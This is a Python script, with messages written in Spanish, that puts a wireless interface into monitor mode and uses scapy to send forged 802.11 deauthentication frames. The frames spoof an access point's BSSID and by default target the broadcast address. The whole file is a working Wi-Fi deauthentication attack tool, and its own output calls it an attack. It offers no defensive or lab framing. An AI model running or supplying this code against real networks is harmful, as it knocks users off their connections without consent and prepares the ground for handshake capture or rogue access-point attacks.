import re
import subprocess
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth

_MAC_RE = re.compile(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')


def _valid_mac(mac):
    return bool(mac and _MAC_RE.match(mac))


def _run(cmd, timeout=15):
    """Ejecuta un comando devolviendo (rc, stdout, stderr)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError as e:
        return 127, "", str(e)
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def check_monitor(interface):
    rc, out, _ = _run(['iw', 'dev', interface])
    return rc == 0 and 'type monitor' in out


def set_channel(interface, channel):
    if channel is None:
        return False
    rc, _, err = _run(['iw', 'dev', interface, 'set', 'channel', str(channel)])
    if rc != 0:
        print(f"[!] No se pudo fijar canal {channel}: {err.strip()}")
        return False
    return True


def _ensure_monitor(interface):
    if check_monitor(interface):
        return True
    print(f"[!] La interfaz {interface} no está en modo monitor. Intentando forzar...")
    _run(['ip', 'link', 'set', interface, 'down'])
    _run(['iw', 'dev', interface, 'set', 'type', 'monitor'])
    _run(['ip', 'link', 'set', interface, 'up'])
    if check_monitor(interface):
        print(f"[+] Modo monitor activado en {interface}.")
        return True
    print(f"[!] No se pudo activar modo monitor en {interface}. Abortando.")
    return False


def send_deauth(interface, bssid, client='ff:ff:ff:ff:ff:ff',
                count=20, interval=0.1, channel=None):
    if not _valid_mac(bssid):
        print(f"[!] BSSID inválido: {bssid}")
        return False
    if not _valid_mac(client):
        print(f"[!] Cliente inválido: {client}")
        return False

    if not _ensure_monitor(interface):
        return False

    if channel is not None and set_channel(interface, channel):
        print(f"[*] Canal fijado a {channel}")

    pkt = (RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid)
           / Dot11Deauth(reason=7))

    print(f"[*] Enviando {count} tramas deauth a {client} desde {bssid}...")
    try:
        sendp(pkt, iface=interface, count=count, inter=interval, verbose=False)
    except Exception as e:
        print(f"[!] Error al enviar tramas: {e}")
        return False
    print("[+] Ataque deauth finalizado.")
    return True
